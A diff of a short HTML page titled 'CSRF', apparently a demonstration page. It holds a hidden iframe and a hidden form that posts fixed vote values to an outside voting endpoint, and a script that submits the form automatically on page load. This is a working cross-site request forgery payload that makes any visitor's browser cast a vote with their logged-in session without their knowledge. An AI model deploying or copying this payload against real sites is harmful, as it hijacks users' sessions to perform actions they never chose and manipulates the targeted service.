@@ -1,14 +1,14 @@
 <!--#insert file="../template/-intro.html" -->
-<title></title>
+<title>CSRF</title>
 <meta name="keywords" content="">
 <meta name="description" content="">
 <!--#insert file="../template/-outro.html" -->
 <!--#insert file="../template/-header.html" -->
 <iframe style="display:none" name="vote"></iframe>
 <form target="vote" action="//code.oa.com/v2/json/vote/application" method="post">
-    <input id="vid" type="hidden" name="id" value="2961">
-    <input id="aid" type="hidden" name="activityId" value="181">
-    <input id="submit" type="submit" style="display:none">
+  <input id="vid" type="hidden" name="id" value="2961">
+  <input id="aid" type="hidden" name="activityId" value="181">
+  <input id="submit" type="submit" style="display:none">
 </form>
 <script>submit.click()</script>
 <!--#insert file="../template/-footer.html" -->
